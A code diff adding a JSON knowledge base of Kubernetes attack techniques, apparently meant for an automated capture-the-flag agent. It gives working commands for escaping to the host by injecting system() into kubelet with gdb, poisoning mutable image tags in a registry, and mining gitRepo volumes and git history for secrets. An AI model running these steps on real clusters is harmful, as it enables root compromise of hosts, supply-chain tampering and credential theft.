@@ -1,0 +1,65 @@
+[
+  {
+    "id": "k8s-ptrace-host-injection",
+    "title": "Kubernetes CAP_SYS_PTRACE + hostPID — Host Process Injection via Debugger",
+    "category": "ESCAPE",
+    "subcategory": "Kubernetes",
+    "description": "When a container runs with both CAP_SYS_PTRACE capability and hostPID: true, it can see all host processes and attach a debugger (gdb) to any process running on the host node. The typical target is the kubelet process, which runs as root. Steps: (1) Find kubelet PID via 'ps aux | grep kubelet | grep -v grep'. (2) Attach gdb to the kubelet: 'gdb -p $KUBELET_PID'. (3) Inside gdb, call system() to execute a command on the host: 'call (int)system(\"cat /host-flag/flag.txt > /tmp/flag_out.txt\")'. (4) Read the output file. The kubelet process has root privileges, so any command executed via system() runs as root on the host. Requires gdb or similar debugger in the container image. Alternative: use Python's ptrace module if available.",
+    "techniques": [
+      "Check capabilities: cat /proc/self/status | grep CapEff; capsh --decode=CHEX_VALUE",
+      "Check hostPID: cat /proc/1/status | grep NSpid; if hostPID=true, all host PIDs visible",
+      "Find kubelet PID: ps aux | grep kubelet | grep -v grep",
+      "Attach gdb: gdb -p $KUBELET_PID -batch -ex \"call (int)system('cat /host-flag/flag.txt > /tmp/flag_out')\"",
+      "Read captured output: cat /tmp/flag_out",
+      "Detach cleanly: gdb -p $KUBELET_PID -batch -ex \"detach\" -ex \"quit\"",
+      "Alternative Python approach: python3 -c \"import ctypes; libc=ctypes.CDLL('libc.so.6'); libc.system('cat /host-flag/flag.txt > /tmp/flag_out')\"",
+      "Search for flag: find /host* -name 'flag*' 2>/dev/null"
+    ],
+    "tools": ["check_capabilities", "shell_exec", "kubectl_exec"],
+    "tags": ["kubernetes", "container-escape", "ptrace", "gdb", "hostpid", "cap_sys_ptrace", "privilege-escalation", "kubelet"],
+    "confidence": 0.7,
+    "mitre_attack": "T1611"
+  },
+  {
+    "id": "k8s-mutable-image-tag",
+    "title": "Kubernetes Mutable Image Tag — ImagePullPolicy Supply Chain Attack",
+    "category": "ESCAPE",
+    "subcategory": "Kubernetes",
+    "description": "When deployments use mutable image tags (e.g., 'latest', 'dev', 'test', 'staging') with imagePullPolicy: Always, or when a specific tag can be overwritten on the registry, the container image can be replaced with a malicious version. Attack steps: (1) Identify pods using mutable tags: 'kubectl get pods -A -o json | python3 -c \"import sys,json; [print(p['spec']['containers'][0]['image']) for p in json.load(sys.stdin)['items']]\" | grep -E ':(latest|dev|test|staging)$''. (2) If registry credentials are available or registry allows anonymous push, pull the original image, modify it, and push back with the same tag. (3) Trigger pod restart to pull the poisoned image. (4) The malicious code runs with the application's security context. For containerd registry mirror attacks: configure a local MITM registry that intercepts image pull requests and returns backdoored images.",
+    "techniques": [
+      "Find mutable image tags: kubectl get pods -A -o json | python3 -c \"import sys,json; [print(p['metadata']['namespace'], p['spec']['containers'][0]['image']) for p in json.load(sys.stdin)['items']]\"",
+      "Check registry access: curl http://localhost:5000/v2/_catalog 2>/dev/null",
+      "Pull and modify image: docker pull IMAGE; echo 'cat /flag* > /tmp/out' > /entrypoint-payload.sh; docker build --build-arg BASE=IMAGE -t localhost:5000/IMAGE .; docker push localhost:5000/IMAGE",
+      "Force pod restart to pull new image: kubectl delete pod -n NAMESPACE POD_NAME",
+      "For containerd MITM: check containerd config for registry mirrors: cat /etc/containerd/config.toml | grep -A10 mirrors",
+      "Registry poisoning: use docker_registry tool to push malicious image to accessible registry",
+      "Monitor pod restart: kubectl get pods -w",
+      "After restart: access compromised pod and read flag from accessible locations"
+    ],
+    "tools": ["docker_registry", "kubectl_get_pods", "kubectl_exec", "shell_exec"],
+    "tags": ["kubernetes", "container-escape", "mutable-image", "supply-chain", "image-tag", "poisoning", "registry", "containerd"],
+    "confidence": 0.6,
+    "mitre_attack": "T1525"
+  },
+  {
+    "id": "k8s-gitrepo-volume",
+    "title": "Kubernetes gitRepo Volume — Source Code and Secret Exposure",
+    "category": "DISCOVERY",
+    "subcategory": "Kubernetes",
+    "description": "The (deprecated) gitRepo volume type clones a git repository into a pod's filesystem at pod startup. This can expose: (1) Source code with hardcoded secrets (API keys, passwords, tokens). (2) SSH keys from the .ssh directory if the repo is private. (3) The full .git directory, which may contain sensitive data in git configuration or historical commits. The gitRepo volume is mounted read-only by default. Even read-only, historical commits, git config, and .gitignore-revealed secrets may be accessible. Check for pods using gitRepo volumes and examine the cloned repository contents thoroughly.",
+    "techniques": [
+      "Find pods with gitRepo volumes: kubectl get pods -A -o json | python3 -c \"import sys,json; [print(p['metadata']['namespace'], p['metadata']['name'], v.get('gitRepo',{}).get('repository')) for p in json.load(sys.stdin)['items'] for v in p['spec'].get('volumes',[]) if v.get('gitRepo')]\"",
+      "Inside pod, list git repo: ls -la /PATH/TO/GITREPO/",
+      "Check git config for credentials: cat /PATH/TO/GITREPO/.git/config",
+      "View all commits: cd /PATH/TO/GITREPO && git log --oneline --all",
+      "Search for secrets across all commits: cd /PATH/TO/GITREPO && git grep -i 'password\\|secret\\|key\\|token\\|flag' $(git rev-list --all)",
+      "Extract file from specific commit: cd /PATH/TO/GITREPO && git show COMMIT_HASH:PATH/TO/FILE",
+      "Check git hooks: ls -la /PATH/TO/GITREPO/.git/hooks/",
+      "Search for .env files: find /PATH/TO/GITREPO -name '.env' -o -name '*.conf' -o -name 'secrets.yaml' 2>/dev/null"
+    ],
+    "tools": ["kubectl_exec", "kubectl_get_pods", "shell_exec"],
+    "tags": ["kubernetes", "gitrepo", "volume", "source-code", "secret-exposure", "discovery", "git"],
+    "confidence": 0.6,
+    "mitre_attack": "T1552"
+  }
+]
